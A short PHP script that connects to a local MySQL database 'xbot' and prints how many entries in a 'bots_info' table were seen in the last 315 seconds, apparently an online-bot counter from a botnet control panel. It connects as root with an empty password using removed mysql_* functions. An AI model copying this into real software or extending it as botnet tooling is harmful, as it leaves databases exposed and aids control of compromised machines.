<?php
mysql_connect('localhost','root','');
mysql_select_db('xbot');
$query="SELECT COUNT(*) FROM `bots_info` WHERE UNIX_TIMESTAMP(CURRENT_TIMESTAMP)-UNIX_TIMESTAMP(`LAST_SEEN`) < 315 ";
$res=mysql_query($query);
$row=mysql_fetch_assoc($res);
echo $row['COUNT(*)'];
?>